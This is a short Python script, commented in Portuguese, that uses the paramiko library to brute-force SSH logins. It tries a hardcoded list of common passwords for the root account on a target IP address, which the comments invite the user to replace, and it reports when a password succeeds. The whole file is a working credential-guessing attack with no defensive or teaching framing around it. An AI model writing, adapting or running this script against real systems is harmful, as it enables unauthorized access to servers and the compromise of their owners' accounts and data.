import paramiko

def brute_force_ssh(target_ip, username, password_list):
    print(f"Iniciando ataque brute force contra SSH em {target_ip}...\n")

    for password in password_list:
        try:
            # Criar um cliente SSH
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Tentando conectar ao servidor
            client.connect(target_ip, username=username, password=password)
            print(f"Senha encontrada: {password}")
            client.close()
            break
        except paramiko.AuthenticationException:
            print(f"Tentativa falhada com senha: {password}")
        except Exception as e:
            print(f"Erro: {e}")
            break

# Lista de senhas para tentar
password_list = ["123456", "password", "admin", "root", "toor"]
target_ip = "192.168.1.1"  # Coloque o IP do alvo aqui
username = "root"  # Username comum para tentativas

brute_force_ssh(target_ip, username, password_list)
